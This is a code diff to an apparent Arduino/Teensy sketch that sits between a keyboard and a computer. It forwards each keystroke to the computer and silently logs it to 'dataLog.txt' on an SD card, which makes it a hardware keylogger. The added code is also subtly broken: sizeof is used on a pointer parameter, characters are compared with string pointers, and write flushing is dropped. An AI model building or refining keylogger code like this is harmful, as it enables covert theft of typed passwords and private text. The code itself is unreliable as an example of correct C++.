@@ -37,6 +37,10 @@ void setup() {
     Serial.println("SD card failed, or not present");
     return;
   }  
+    uint64_t cardSize = SD.cardSize() / (1024 * 1024);
+    Serial.print("Taille de la carte SD : ");
+    Serial.print(cardSize);
+    Serial.println(" Mo.");
 
   //Ouvrir le fichier de log de données
   dataLog = SD.open("dataLog.txt", FILE_WRITE);
@@ -71,7 +75,13 @@ const char * bthid_driver_names[CNT_HIDDEVICES] = {"KB(BT)"};
 bool bthid_driver_active[CNT_HIDDEVICES] = {false};
 #endif
 
-
+bool in(char key, const char* specialKeys[]) {
+  for (int i = 0; i < sizeof(specialKeys); i++) {
+    if (key == specialKeys[i]) 
+      return true;
+  }
+  return false;
+}
 
 void OnPress(int key) {
   static File dataLog = SD.open("dataLog.txt", FILE_WRITE);
@@ -81,20 +91,18 @@ void OnPress(int key) {
                                      "F6", "F7", "F8", "F9", "F10", "F11", "F12"
                                 };
 
-  static const size_t numSpecialKeys = sizeof(specialKeys) / sizeof(specialKeys[0]);
+    if (!in(key, specialKeys)) {
+        Keyboard.print(key);
+        dataLog.print(key);
+
+        // For the ouput for debugging
+        Serial.print(key);
+        Serial.println(dataLog.size());
+
+    }
+
+    if((char)key == "\n" || (char)key == "\r")
+        Serial.println("");
+
   
-  if (key == KEYD_ENTER || key == KEYD_RETURN) {
-    Serial.println("");
-  } else if (key < numSpecialKeys) {
-    Serial.print(specialKeys[key]);
-  } else {
-    char ch = (char)key;
-    Keyboard.print(ch);
-    dataLog.print(ch);
-    Serial.print(ch);
-  }
-  
-  if (dataLog && dataLog.availableForWrite() < 32) {
-    dataLog.flush();
-  }
 }
